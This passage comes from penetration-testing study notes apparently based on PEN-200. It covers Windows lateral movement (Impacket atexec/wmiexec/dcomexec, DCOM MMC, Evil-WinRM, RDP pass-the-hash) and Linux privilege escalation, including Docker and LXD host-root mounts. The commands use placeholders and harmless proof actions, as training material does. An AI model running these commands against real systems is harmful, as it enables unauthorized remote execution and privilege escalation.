Purpose and result A verified one-shot remote task command effect. ### 2. Recognition clues The identity has remote task rights and a compatible output path. #### Find the clue from your starting access **Where to investigate:** Use destination RPC/SMB evidence and effective administrative/task rights to investigate Task Scheduler as a one-shot execution consumer. **Discovery action — reference example:** ```powershell Test-NetConnection TARGET -Port 135 Test-NetConnection TARGET -Port 445 ``` **Illustrative evidence — synthetic, abbreviated:** The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. ```text 135: reachable 445: reachable Remote task creation and output ACLs: not yet known ``` **Recognize this detail:** The required network services are candidates; a task cannot be assumed creatable from port results. **Still missing before method selection:** Check negotiated RPC reachability, task-create permission, actual principal and administrative output channel. | Outcome after checking | Example and next decision | | --- | --- | | Enabled after validation | Task creation/execution and the bounded effect are verified: choose ATExec. | | Ruled out in this context | The account lacks remote task rights: reject this method while retaining other service access. | | Inconclusive | A task-run request accepted without process/effect evidence is inconclusive. | **If you do not yet have this clue:** start with [Match route, destination service and effective authorization](lateral-movement.md#move-preflight). ### 3. Prerequisites **Starting access:** Identified authentication material, destination service reachability and a candidate authorized identity. **Required conditions:** Task Scheduler RPC reachability, effective task-creation rights and the required administrative output access. ### 4. Discover and verify prerequisites ```powershell Test-NetConnection TARGET -Port 135 Test-NetConnection TARGET -Port 445 ``` ### 5. Why it works Remote task creation and file-based output retrieval are separate operations. ATExec is not a full interactive shell; task principal and execution result must be checked. ### 6. Execute and choose variants ```bash impacket-atexec 'DOMAIN/USER:PASSWORD@TARGET_HOST' "cmd.exe /c hostname & whoami" impacket-atexec -hashes :NT_HASH 'DOMAIN/USER@TARGET_HOST' "cmd.exe /c hostname & whoami" ``` > ATExec creates and deletes a scheduled task and normally retrieves output from `ADMIN$\Temp`. It is a one-shot command mechanism, not an interactive shell; task-scheduler RPC and administrative share access must both work. Kerberos: ```bash export KRB5CCNAME="$PWD/USER.ccache" impacket-atexec -k -no-pass -dc-ip DC_IP 'DOMAIN/USER@TARGET_HOST' "cmd.exe /c hostname & whoami" ``` ### 7. Worked example — hypothetical Observation: the identity can create tasks on the destination. Test: run a bounded hostname/identity command and inspect output. Illustrative output: the correct host responds under the task principal. Interpretation: decide whether one-shot execution is sufficient or a session is needed. ### 8. Verify the result Verify the actual task effect/principal and destination, not task registration alone. ### 9. Failure and fallback Dynamic RPC filtering, task authorization or denied output share can break different phases. ### 10. Next transitions [Verify command execution, host and represented identity](sessions-transfers.md#session-proof); [Establish Windows token, host and process context](windows-privesc.md#windows-state); [Match route, destination service and effective authorization](lateral-movement.md#move-preflight). ## Execute through WMI or native CIM over DCOM **Blocks:** 12; consumes routes from 13. [Operational procedure](../../reference/06-ad-lateral-movement/05-lateral-movement.md#impacket-wmiexec) | [Operational procedure](../../reference/06-ad-lateral-movement/05-lateral-movement.md#native-powershell-cim-over-dcom) | [Quick sheet](../../cheatsheets/active-directory.md) ### 1. Purpose and result A remote process effect and, when available, retrieved command output. ### 2. Recognition clues A destination exposes WMI/DCOM and the identity has useful namespace/process rights. #### Find the clue from your starting access **Where to investigate:** Investigate WMI from RPC/service inventory and exact account rights; keep process creation and SMB-based output retrieval as separate legs. **Discovery action — reference example:** ```powershell Test-NetConnection TARGET -Port 135 Test-NetConnection TARGET -Port 445 ``` **Illustrative evidence — synthetic, abbreviated:** The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. ```text Endpoint mapper: reachable SMB output path: reachable Dynamic RPC and WMI namespace rights: unknown ``` **Recognize this detail:** Port 135 and an output route justify further checks but do not prove a WMI process can be created. **Still missing before method selection:** Validate dynamic ports, DCOM/WMI authorization, native CIM transport choice and actual effect. | Outcome after checking | Example and next decision | | --- | --- | | Enabled after validation | Authorized process creation plus a working observation/output path exists: use WMI/CIM. | | Ruled out in this context | The required namespace/activation permission is denied: reject that identity's WMI route. | | Inconclusive | Execution may succeed with failed output retrieval; inspect a controlled effect before concluding. | **If you do not yet have this clue:** start with [Match route, destination service and effective authorization](lateral-movement.md#move-preflight). ### 3. Prerequisites **Starting access:** Identified authentication material, destination service reachability and a candidate authorized identity. **Required conditions:** RPC endpoint mapper plus negotiated dynamic ports; effective WMI/DCOM rights; the selected output path may additionally need SMB. ### 4. Discover and verify prerequisites ```powershell Test-NetConnection TARGET -Port 135 Test-NetConnection TARGET -Port 445 ``` ### 5. Why it works WMI can create a process while SMB output retrieval fails. Modern CIM defaults can use WSMan, so select the documented DCOM session option when that transport is intended. ### 6. Execute and choose variants ```bash impacket-wmiexec 'DOMAIN/USER:PASSWORD@TARGET' impacket-wmiexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' ``` > WMIExec creates processes through WMI/DCOM. Its normal output channel uses SMB and defaults to `ADMIN$`; therefore a WMI process may run even when output retrieval fails. `-nooutput` or `-silentcommand` changes that evidence channel. Kerberos with separate name and route: ```bash export KRB5CCNAME="$PWD/USER.ccache" impacket-wmiexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST' ```
One command, no SMB output ```bash impacket-wmiexec -nooutput 'DOMAIN/USER:PASSWORD@TARGET' "cmd.exe /c echo MOVEMENT_OK > C:\Windows\Temp\movement-proof.txt" ``` Verify the harmless artifact through an independently authorized channel. No returned stdout is expected.
```powershell $Credential = Get-Credential 'DOMAIN\USER' $Options = New-CimSessionOption -Protocol Dcom $Session = New-CimSession -ComputerName TARGET_HOST -Credential $Credential -SessionOption $Options Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = 'cmd.exe /c hostname > C:\Windows\Temp\movement-proof.txt' } Remove-CimSession $Session ``` > `ReturnValue = 0` and a process ID confirm process creation, not its final effect. WMI-created processes run in session 0; GUI programs will not appear on an interactive desktop. ### 7. Worked example — hypothetical Observation: WMIExec appears to hang after process creation. Test: check the controlled effect independently and inspect SMB output access. Illustrative output: the process ran but the share read was denied. Interpretation: execution is proven; repair the output channel or use another observation. ### 8. Verify the result Verify destination process/effect and execution identity separately from captured stdout. ### 9. Failure and fallback Port 135 alone is insufficient. Distinguish RPC route, namespace permission, output share and local token filtering. ### 10. Next transitions [Verify command execution, host and represented identity](sessions-transfers.md#session-proof); [Diagnose connection direction, listener and session failures in order](execution.md#execution-callback); [Use WinRM, WinRS or PowerShell remoting](lateral-movement.md#move-winrm). ## Execute through an authorized DCOM application object **Blocks:** 12; consumes routes from 13. [Operational procedure](../../reference/06-ad-lateral-movement/05-lateral-movement.md#dcom-mmc-method) | [Quick sheet](../../cheatsheets/active-directory.md) ### 1. Purpose and result A verified remote application-mediated process effect. ### 2. Recognition clues A usable remote COM application and effective activation/method rights. #### Find the clue from your starting access **Where to investigate:** Use the target's RPC and administration evidence to investigate a specific supported COM application, rather than treating DCOM as a universal shell. **Discovery action — reference example:** ```powershell Test-NetConnection TARGET -Port 135 ``` **Illustrative evidence — synthetic, abbreviated:** The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. ```text RPC endpoint mapper: reachable Candidate application: MMC20.Application.1 Activation/method authorization: not yet known ``` **Recognize this detail:** A named application and route form a candidate; component availability and allowed activation/method remain separate. **Still missing before method selection:** Check dynamic RPC, actual class/rights, authentication/tool support, method and verifiable output/effect. | Outcome after checking | Example and next decision | | --- | --- | | Enabled after validation | The intended authorized application method produces the remote effect: choose this DCOM route. | | Ruled out in this context | The component is absent or activation is denied: reject that class-based chain. | | Inconclusive | A created COM object without command/effect evidence leaves execution unproved. | **If you do not yet have this clue:** start with [Match route, destination service and effective authorization](lateral-movement.md#move-preflight). ### 3. Prerequisites **Starting access:** Identified authentication material, destination service reachability and a candidate authorized identity. **Required conditions:** RPC/dynamic-port route, allowed DCOM activation and application method, supported authentication and target component. ### 4. Discover and verify prerequisites ```powershell Test-NetConnection TARGET -Port 135 ``` ### 5. Why it works A DCOM application can expose a method that launches commands under its authorized context. Session 0 can hide graphical output, so use a verifiable process/file/command effect. ### 6. Execute and choose variants Current Windows token: ```powershell $Type = [type]::GetTypeFromProgID('MMC20.Application.1','TARGET_HOST') $Object = [Activator]::CreateInstance($Type) $Object.Document.ActiveView.ExecuteShellCommand( 'cmd.exe', $null, '/c hostname > C:\Windows\Temp\movement-proof.txt', '7' ) ``` Impacket with password or NT hash: ```bash impacket-dcomexec 'DOMAIN/USER:PASSWORD@TARGET' impacket-dcomexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' ``` > Current Impacket `dcomexec` explicitly rejects Kerberos for its supported MMC/Shell DCOM objects because they do not accept the required HOST ticket. Use `wmiexec -k` when Kerberos command execution is required. DCOM class availability, RPC reachability and launch/access permissions vary. ### 7. Worked example — hypothetical Observation: an MMC object can be activated remotely. Test: invoke the documented minimal command and observe its output/effect. Illustrative output: a target-side marker appears while no desktop window is visible. Interpretation: session isolation explains the missing GUI. ### 8. Verify the result Verify the actual destination effect and identity; COM object creation alone does not prove command execution. ### 9. Failure and fallback Component absence, activation rights, modern DCOM hardening or unsupported client Kerberos can block this route. ### 10. Next transitions [Verify command execution, host and represented identity](sessions-transfers.md#session-proof); [Match route, destination service and effective authorization](lateral-movement.md#move-preflight); [Repair quoting, encoding and command-length boundaries](execution.md#execution-parser). ## Use WinRM, WinRS or PowerShell remoting **Blocks:** 12; consumes routes from 13. [Operational procedure](../../reference/06-ad-lateral-movement/05-lateral-movement.md#6-winrm-winrs-and-powershell-remoting) | [Quick sheet](../../cheatsheets/active-directory.md) ### 1. Purpose and result A verified remote command session under the endpoint-authorized identity. ### 2. Recognition clues A WinRM listener and a candidate endpoint-authorized account. #### Find the clue from your starting access **Where to investigate:** Check observed WinRM listeners from the real source and relate the identity to the configured endpoint/session authorization. **Discovery action — reference example:** ```powershell Test-NetConnection TARGET -Port 5985 Test-NetConnection TARGET -Port 5986 ``` **Illustrative evidence — synthetic, abbreviated:** The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. ```text 5985: reachable SMB credential: accepted WinRM endpoint authorization: unknown ``` **Recognize this detail:** A reachable endpoint plus a known credential is a candidate, not proof the account may enter that remoting session. **Still missing before method selection:** Verify accepted authentication, correct name/TLS context, endpoint rights and any second-hop requirements. | Outcome after checking | Example and next decision | | --- | --- | | Enabled after validation | The endpoint opens the intended session and identity is verified: choose WinRM/WinRS/remoting. | | Ruled out in this context | A valid account is denied the endpoint: reject that session configuration for this identity. | | Inconclusive | Second-hop resource failure does not disprove the first WinRM authentication. | **If you do not yet have this clue:** start with [Match route, destination service and effective authorization](lateral-movement.md#move-preflight). ### 3. Prerequisites **Starting access:** Identified authentication material, destination service reachability and a candidate authorized identity. **Required conditions:** Reachable HTTP(S) listener, accepted authentication and endpoint/session configuration permissions; hash/ticket support depends on client/context. ### 4. Discover and verify prerequisites ```powershell Test-NetConnection TARGET -Port 5985 Test-NetConnection TARGET -Port 5986 ``` ### 5. Why it works WinRM authentication is separate from endpoint authorization and delegated second-hop credentials. Evil-WinRM, WinRS and native remoting expose related services with different client features. ### 6. Execute and choose variants ##### Evil-WinRM ```bash # Password; omit -p to prompt where supported evil-winrm -i TARGET_HOST -u USER -p 'PASSWORD' # NT hash evil-winrm -i TARGET_HOST -u USER -H NT_HASH # HTTPS listener evil-winrm -i TARGET_HOST -u USER -p 'PASSWORD' -S -P 5986 ``` Current Evil-WinRM ticket-file support: ```bash evil-winrm -i TARGET_FQDN -r DOMAIN -K USER.ccache --spn HTTP ``` > **Need:** reachable 5985/5986, an enabled WinRM/PowerShell endpoint and endpoint authorization. The identity is commonly an administrator or a member of the applicable remote-management group, but endpoint SDDL/policy is decisive. Kerberos requires the FQDN/SPN, realm/KDC configuration and a compatible ticket. ##### Native WinRS ```cmd winrs /r:TARGET_HOST /u:DOMAIN\USER /p:PASSWORD "cmd /c hostname & whoami" ``` To avoid retaining a password on the command line, use the current authorized Windows credential context where possible: ```cmd winrs /r:TARGET_HOST "cmd /c hostname & whoami" ``` > WinRS uses WinRM. A non-administrator can require `/noprofile` depending on endpoint configuration. `/allowdelegate` affects onward credential use and is not a default fix for the double-hop problem. ##### PowerShell remoting ```powershell Test-WSMan TARGET_HOST $Credential = Get-Credential 'DOMAIN\USER' Invoke-Command -ComputerName TARGET_HOST -Credential $Credential -ScriptBlock { hostname whoami /all } $Session = New-PSSession -ComputerName TARGET_HOST -Credential $Credential Enter-PSSession -Session $Session ``` > A hostname normally supports Negotiate/Kerberos in a domain. An IP address requires explicit credentials and generally HTTPS or a tightly scoped TrustedHosts configuration. Do not weaken global TrustedHosts merely to hide DNS/SPN mistakes. ### 7. Worked example — hypothetical Observation: domain credentials work over SMB. Test: check the WinRM endpoint and rights. Illustrative output: an authenticated PowerShell session opens, but access to a second network resource fails. Interpretation: investigate double-hop delegation, not the original password. ### 8. Verify the result Verify hostname, whoami /all and the actual session configuration/rights. ### 9. Failure and fallback Authentication denial, endpoint denial, TLS/name mismatch and second-hop failure require different fixes. ### 10. Next transitions [Establish Windows token, host and process context](windows-privesc.md#windows-state); [Obtain accessible live logon-session credential material](ad-identities.md#ad-lsass); [Match route, destination service and effective authorization](lateral-movement.md#move-preflight). ## Obtain an authorized RDP interactive session **Blocks:** 12; consumes routes from 13. [Operational procedure](../../reference/06-ad-lateral-movement/05-lateral-movement.md#7-rdp) | [Operational procedure](../../reference/03-initial-access/01-rdp-access.md) | [Quick sheet](../../cheatsheets/active-directory.md) ### 1. Purpose and result A verified remote-interactive desktop/logon context. ### 2. Recognition clues RDP is reachable and the identity may have remote-interactive logon rights. #### Find the clue from your starting access **Where to investigate:** Check the destination RDP endpoint and use actual group/logon-policy evidence for the candidate identity; determine whether password or Restricted Admin is intended. **Discovery action — reference example:** ```powershell Test-NetConnection TARGET -Port 3389 ``` **Illustrative evidence — synthetic, abbreviated:** The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. ```text 3389: reachable Candidate identity: DOMAIN\USER Remote-interactive logon right: not yet confirmed ``` **Recognize this detail:** RDP transport does not grant desktop access; Restricted Admin/hash use has additional requirements. **Still missing before method selection:** Check NLA/TLS, identity qualification, logon authorization and the chosen authentication mode. | Outcome after checking | Example and next decision | | --- | --- | | Enabled after validation | The authorized interactive logon opens under the verified token: choose RDP. | | Ruled out in this context | The account lacks the required logon right or the hash route lacks Restricted Admin support: reject that variant. | | Inconclusive | A generic connection error requires separating client/protocol/policy before judging the credential. | **If you do not yet have this clue:** start with [Match route, destination service and effective authorization](lateral-movement.md#move-preflight). ### 3. Prerequisites **Starting access:** Identified authentication material, destination service reachability and a candidate authorized identity. **Required conditions:** Allowed account/session policy and compatible client/NLA/TLS; hash-based Restricted Admin has additional supported-policy/admin requirements. ### 4. Discover and verify prerequisites ```powershell Test-NetConnection TARGET -Port 3389 ``` ### 5. Why it works RDP is an access method, not automatic local elevation. Restricted Admin/hash use and ordinary password logon have different requirements and network credential behavior. ### 6. Execute and choose variants Check the installed binary name: ```bash command -v xfreerdp3 || command -v xfreerdp ``` Password: ```bash xfreerdp3 /v:TARGET_HOST /d:DOMAIN /u:USER /p:'PASSWORD' /cert:ignore /dynamic-resolution +clipboard ``` Older packages may expose the same syntax through `xfreerdp`. NT hash: ```bash xfreerdp3 /v:TARGET_HOST /d:DOMAIN /u:USER /pth:NT_HASH /cert:ignore /dynamic-resolution ``` > FreeRDP's `/pth` uses Restricted Admin mode. The target must support/permit that mode and the identity must be an administrator; ordinary Remote Desktop Users membership is not sufficient for Restricted Admin. Password-based RDP instead needs the Remote Desktop service, NLA compatibility and the effective “Allow log on through Remote Desktop Services” right without a deny override. Native client: ```cmd mstsc.exe /v:TARGET_HOST mstsc.exe /restrictedAdmin /v:TARGET_HOST ``` Ordinary RDP can place reusable user credentials in the destination's LSASS. Restricted Admin avoids sending those reusable credentials but prevents ordinary onward access as that user; treat the resulting session's network identity separately. > **Purpose:** use a validated identity with Remote Desktop logon rights to establish a Windows desktop and verify the resulting source position. ##### Baseline: prompt for the password ```bash xfreerdp3 /v:TARGET /u:USER /dynamic-resolution /cert:ignore ``` Some Kali releases expose `xfreerdp` instead of `xfreerdp3`; check `command -v xfreerdp3 xfreerdp` and the selected binary's `/help` output. > **Decisive output:** a usable desktop establishes a remote session. Open PowerShell or Command Prompt and verify `whoami`, `hostname` and `ipconfig` before treating commands as target-origin execution.
Variant — domain identity ```bash xfreerdp3 /v:TARGET /u:USER /d:DOMAIN /dynamic-resolution /cert:ignore ``` Local and domain accounts with the same username are different identities. Make the intended context explicit when results differ.
Variant — authentication only ```bash xfreerdp3 /v:TARGET /u:USER /d:DOMAIN /auth-only /cert:ignore ``` This tests authentication without opening the UI. Success does not guarantee that all session policies or desktop initialization will permit a full session.
Variant — explicit password ```bash xfreerdp3 /v:TARGET /u:USER '/p:PASSWORD' /dynamic-resolution /cert:ignore ``` Prefer prompting because command-line passwords can enter shell history and process listings.
> **Failure cues:** a certificate warning is not a credential result. NLA/security negotiation, account context, authentication, Remote Desktop logon rights and an already occupied/restricted session can fail separately. `/cert:ignore` is appropriate only for the controlled lab context because it removes certificate identity validation. > **Next:** after verifying the host and identity, enumerate groups/privileges, files, local services/listeners and routes from the new source position. ### 7. Worked example — hypothetical Observation: a domain user is in the destination's RDP access group. Test: perform a correctly qualified login. Illustrative output: a desktop opens under a non-admin token. Interpretation: establish host/token state and inspect the new access context. ### 8. Verify the result Verify destination, user/token and permitted desktop actions; keep credentials out of reusable screenshots/notes. ### 9. Failure and fallback A valid password can still lack logon rights. NLA, TLS, domain qualification and Restricted Admin policy are separate conditions. ### 10. Next transitions [Establish Windows token, host and process context](windows-privesc.md#windows-state); [Recover Windows application, history and stored-credential artifacts](windows-privesc.md#windows-secrets); [Select password, NT hash, key-to-ticket or ticket authentication](lateral-movement.md#move-auth-material). ## Sources and shared concepts Supplied PEN-200 Ch 24 pp793–812. [Impacket examples](https://github.com/fortra/impacket/tree/master/examples), [PowerShell remoting](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/ps-remoting-security-considerations), [FreeRDP](https://github.com/FreeRDP/FreeRDP/wiki/CommandLineInterface). Commands and their adjacent variant conditions are synchronized extracts of the linked operational procedures. Those procedures own complete execution details; this guide owns method selection, explanations and worked reasoning. Tool availability on the learner's Kali or a target must be checked in that environment.

# Escalate privileges on Linux [Strategy map](../Attack_Strategy_Map.md) | [Master Notes](../Master_Notes.md) | [Operational index](../../README.md) | [Cheatsheets](../../cheatsheets/README.md) For each candidate prove controlled object → effective permission → privileged consumer → execution identity → trigger → effect. Enumeration tools suggest candidates; they do not establish that chain. **Speedrun blocks:** 8. **Documented methods:** 16. Examples are hypothetical study material. Apply commands only to an assigned scope during the later practice phase. A method is enabled by its prerequisites; its presence here does not establish a vulnerability or practical mastery. ## First pass: tools and findings Use the branch matching the current host, identity and observed result. Tool output supplies leads; the linked procedure verifies and uses the exact condition. ### Identify the session, then run LinPEAS early After checking id, architecture and shell availability, transfer a trusted reviewed LinPEAS copy using the transfer procedure. The sh invocation does not need an executable bit. Save output; use the local -h before selecting optional flags. ```bash id uname -m command -v bash python3 ls -ld /tmp ``` ```bash sh ./linpeas.sh | tee linpeas.txt ``` - **If sudo/NOPASSWD or an allowed binary:** Run sudo -l and compare run-as, exact path and permitted arguments with the chosen escape. → [Use an allowed sudo operation to cross a privilege boundary](linux-privesc.md#linux-sudo). - **If A root-owned SUID binary:** Check the exact file, mount flags and its available privileged operation. → [Use a SUID or SGID program's exposed privileged primitive](linux-privesc.md#linux-suid). - **If A useful file capability:** Match the capability to the exact executable operation and mount. → [Use a file capability that enables a specific privileged operation](linux-privesc.md#linux-capabilities). - **If A password, key or application config:** Read the source file and identify which account/service it belongs to. → [Recover credentials from Linux user, service and process trails](linux-privesc.md#linux-secrets). - **Otherwise:** LinPEAS cannot run or shows no usable finding: use the native identity/permissions checks; quiet output does not prove no escalation. → [Establish Linux state and choose an escalation candidate](linux-privesc.md#linux-state). ### Check sudo rules against the actual binary Use only the operation permitted by the entire rule. Select the matching GTFOBins mode/build instead of trying every example. ```bash sudo -n -l 2>&1 sudo -l ``` - **If (root) NOPASSWD permits a useful interpreter/helper:** Check argument restrictions and privilege retention, then use that exact permitted invocation. → [Use an allowed sudo operation to cross a privilege boundary](linux-privesc.md#linux-sudo). - **If LD_PRELOAD is explicitly permitted/preserved:** Verify a dynamically linked allowed program and the variable-setting permission. → [Load a controlled library through a permitted sudo environment](linux-privesc.md#linux-preload). - **Otherwise:** No useful sudo rule: check SUID/SGID and capabilities; do not keep trying sudo payloads. → [Use a SUID or SGID program's exposed privileged primitive](linux-privesc.md#linux-suid). ### Catch short-lived root jobs with pspy Use a reviewed binary matching the target architecture; keep it running long enough to observe the suspected schedule. Stop after collecting the needed events. ```bash ./pspy64 ``` - **If UID=0 repeatedly invokes a script under /opt or another path:** Check the script and each parent with namei/stat/getfacl, then identify the schedule/trigger. → [Control a script, binary or configuration consumed by a privileged job/service](linux-privesc.md#linux-jobs). - **If A privileged job invokes a helper without an absolute path:** Inspect the real PATH and a writable directory searched first. → [Hijack an unqualified helper through controlled PATH resolution](linux-privesc.md#linux-path). - **Otherwise:** No event was observed: inspect cron/timers/services directly rather than assuming no privileged job exists. → [Control a script, binary or configuration consumed by a privileged job/service](linux-privesc.md#linux-jobs). ### Test SUID/capability findings manually Use native discovery alongside the tool output; a flagged executable is only useful if it retains a relevant privilege. ```bash find / -xdev -type f -perm -4000 -ls 2>/dev/null find / -xdev -type f -perm -2000 -ls 2>/dev/null findmnt -T /PATH/TO/BINARY ``` - **If A root-owned SUID program exposes a usable operation:** Check nosuid, exact build and effective identity after that operation. → [Use a SUID or SGID program's exposed privileged primitive](linux-privesc.md#linux-suid). - **If An executable has a useful file capability:** Check the named capability and its effective operation under this mount. → [Use a file capability that enables a specific privileged operation](linux-privesc.md#linux-capabilities). - **If A root-consumed file/parent is writable:** Validate the real consumer and trigger before modification. → [Prove effective file, directory, ACL and mount control](linux-privesc.md#linux-permissions). - **Otherwise:** No useful privileged executable: return to secrets, scheduled consumers, mounts and local-only services. → [Recover credentials from Linux user, service and process trails](linux-privesc.md#linux-secrets). ## Discovery workflow Start with a low-privileged Linux command channel. No sudo rule, writable privileged script or usable SUID binary is assumed. Follow these observations into a method; the detailed recognition routes below show synthetic output and the checks still needed. 1. Establish effective IDs/groups, mounts, processes and exact sudo rules: [Establish Linux state and choose an escalation candidate](linux-privesc.md#linux-state). 2. Follow readable application/history/process artifacts into typed credentials: [Recover credentials from Linux user, service and process trails](linux-privesc.md#linux-secrets). 3. Inspect sudo/SUID/capabilities and prove effective object/parent permissions: [Use an allowed sudo operation to cross a privilege boundary](linux-privesc.md#linux-sudo); [Use a SUID or SGID program's exposed privileged primitive](linux-privesc.md#linux-suid); [Use a file capability that enables a specific privileged operation](linux-privesc.md#linux-capabilities); [Prove effective file, directory, ACL and mount control](linux-privesc.md#linux-permissions). 4. Identify each job/service's real identity, consumed path and trigger; only then examine resolution abuse: [Control a script, binary or configuration consumed by a privileged job/service](linux-privesc.md#linux-jobs); [Hijack an unqualified helper through controlled PATH resolution](linux-privesc.md#linux-path); [Turn wildcard-expanded filenames into privileged command options](linux-privesc.md#linux-wildcard); [Control a privileged program's shared-library resolution](linux-privesc.md#linux-library). 5. Investigate daemon/mount/software candidates against their exact conditions: [Use privileged group, daemon or container-management control](linux-privesc.md#linux-containers); [Exploit a permission-backed mount, NFS mapping or local service](linux-privesc.md#linux-mounts); [Select an evidence-matched Linux software or kernel exploit](linux-privesc.md#linux-kernel). **Decision rule:** an observed clue opens a candidate. Choose it only after the missing conditions are verified; a failed check rules out that context, while unavailable evidence stays inconclusive. ## Method families - **Identity, permissions and secret Prerequisites **Starting access:** A verified Linux foothold with a known effective UID, groups and filesystem context. **Required conditions:** Effective daemon/API permission, correct rootful/rootless or privileged mode, available resources and a host-affecting operation. ### 4. Discover and verify prerequisites ```bash id ls -l /var/run/docker.sock findmnt cat /proc/1/cgroup ``` ### 5. Why it works Controlling a rootful container daemon can grant host-mount operations; root inside a restricted/rootless container is a different authority. Socket presence alone proves no API access. ### 6. Execute and choose variants ```bash id ls -l /var/run/docker.sock /run/docker.sock 2>/dev/null docker version 2>/dev/null lxc list 2>/dev/null ``` Group candidates include `docker`, `lxd`/`lxc`, `disk`, `shadow`, `adm`, `systemd-journal` and `libvirt`. Prove the associated resource and effective permission.
Rootful Docker daemon with an available image ```bash docker images docker run --rm -it -v /:/host IMAGE chroot /host /bin/sh ``` > Requires daemon/socket access, a rootful daemon, usable image and allowed host bind mount. Rootless mode, user namespaces, authorization plugins and SELinux can change the effect.
LXD/LXC with an available image alias ```bash lxc image list lxc init IMAGE_ALIAS privesc -c security.privileged=true lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true lxc start privesc lxc exec privesc /bin/sh ``` > Requires configured daemon access, sufficient group rights, image availability and privileged-container/device support.
### 7. Worked example — hypothetical Observation: docker group access reaches a rootful daemon. Test: inspect its available image and mount permissions using the documented procedure. Illustrative output: a controlled container can read the intended host filesystem. Interpretation: verify host context before claiming host root. ### 8. Verify the result Distinguish host and container namespace, effective UID and the exact host operation. ### 9. Failure and fallback Rootless mode, user namespaces, policy or absent images can change the route. Do not equate a container prompt with host compromise. ### 10. Next transitions [Establish Linux state and choose an escalation candidate](linux-privesc.md#linux-state); [Recover credentials from Linux user, service and process trails](linux-privesc.md#linux-secrets); [Exploit a permission-backed mount, NFS mapping or local service](linux-privesc.md#linux-mounts). ## Exploit a permission-backed mount, NFS mapping or local service **Blocks:** 8. [Operational procedure](../../reference/05-local-privilege-escalation/01-linux-privilege-escalation.md#11-mounts-nfs-and-local-services) | [Quick sheet](../../cheatsheets/linux-privesc.md) ### 1. Purpose and result A useful file/credential operation or verified local service access. ### 2. Recognition clues A writable/exported filesystem or a loopback-only service with useful privileges. #### Find the clue from your starting access **Where to investigate:** Inspect mounts, exports and local listeners after the foothold; correlate each with its identity and reachable service. **Discovery action — reference example:** ```bash findmnt cat /etc/exports 2>/dev/null ss -lntup ``` **Illustrative evidence — synthetic, abbreviated:** The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. ```text Listener: 127.0.0.1:DATABASE_PORT Export option candidate: no_root_squash ``` **Recognize this detail:** A local-only service or export mapping creates a specific investigation route, not automatic escalation. **Still missing before method selection:** For the service check accepted identity/rights; for NFS check client mapping, write permissions, mount flags and target-side consumer. | Outcome after checking | Example and next decision | | --- | --- | | Enabled after validation | The complete mapped-file or authenticated local-service primitive is verified: select it. | | Ruled out in this context | root_squash/nosuid or insufficient service rights defeats the proposed privileged chain. | | Inconclusive | Export text or a listen socket without actual access leaves the candidate incomplete. | **If you do not yet have this clue:** start with [Establish Linux state and choose an escalation candidate](linux-privesc.md#linux-state). ### 3. Prerequisites **Starting access:** A verified Linux foothold with a known effective UID, groups and filesystem context. **Required conditions:** Relevant export/mount options or service authentication; effective identity, writable path and any privileged execution consumer. ### 4. Discover and verify prerequisites ```bash findmnt cat /etc/exports 2>/dev/null ss -lntup ss -lxnp ``` ### 5. Why it works A new mount or local listener changes reachable objects, not automatically privilege. NFS numeric-ID mapping, squash options and local service rights must be tested in their actual context. ### 6. Execute and choose variants ```bash findmnt cat /etc/fstab mount ss -lntup ss -lxnp ``` For NFS, a writable export plus `no_root_squash` can trust client-root-created ownership/SUID metadata. Confirm export options, writable mount, target-side mount options and compatible execution. See [NFS/RPC](../../reference/02-service-enumeration/05-nfs-rpc.md). Root-only loopback services and UNIX sockets are candidates only. Identify protocol/authentication and prove a privileged action through a controlled request, configuration, plugin or file. ### 7. Worked example — hypothetical Observation: a loopback database is inaccessible externally. Test: identify its credentials and access it locally or through a justified forward. Illustrative output: data reads succeed as a limited DB user. Interpretation: follow the database's actual rights. ### 8. Verify the result Verify the actual file/service operation, mapped identity and any resulting execution effect. ### 9. Failure and fallback An exposed export or listener is only a candidate. Validate mapping, authentication and consumer before claiming escalation. ### 10. Next transitions [Inspect RPC/NFS exports and effective file identity](services.md#service-nfs); [Use MySQL/MariaDB data and file primitives](services.md#service-mysql); [Forward a selected service through an SSH client-side listener](pivoting.md#ssh-local). ## Select an evidence-matched Linux software or kernel exploit **Blocks:** 8. [Operational procedure](../../reference/05-local-privilege-escalation/01-linux-privilege-escalation.md#13-softwarekernel-exploits-evidence-last) | [Quick sheet](../../cheatsheets/linux-privesc.md) ### 1. Purpose and result A justified local exploit test and independently verified privilege result. ### 2. Recognition clues Permission/credential paths are insufficient and an exact affected build/configuration is present. #### Find the clue from your starting access **Where to investigate:** Collect distribution build/package/architecture and the required local feature before comparing a specific advisory/PoC. **Discovery action — reference example:** ```bash uname -a cat /etc/os-release getconf LONG_BIT ``` **Illustrative evidence — synthetic, abbreviated:** The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. ```text Kernel release: KERNEL_RELEASE Distribution package/build: VENDOR_BUILD Required vulnerable feature: not yet verified ``` **Recognize this detail:** A version-associated advisory is a candidate; backports and feature state determine applicability. **Still missing before method selection:** Collect uname and the distribution's package/build plus architecture. Match the advisory's vulnerable feature and vendor patch status before choosing a PoC; try a confirmed sudo/file/credential route first when one exists. | Outcome after checking | Example and next decision | | --- | --- | | Enabled after validation | Affected code/configuration and compatible reviewed PoC are established: select its bounded test. | | Ruled out in this context | The vendor build includes the fix or required feature is absent: reject that exploit. | | Inconclusive | A release string without patch/configuration evidence leaves vulnerability unconfirmed. | **If you do not yet have this clue:** start with [Establish Linux state and choose an escalation candidate](linux-privesc.md#linux-state). ### 3. Prerequisites **Starting access:** A verified Linux foothold with a known effective UID, groups and filesystem context. **Required conditions:** Vulnerable package/kernel state, architecture, mitigations, namespaces and 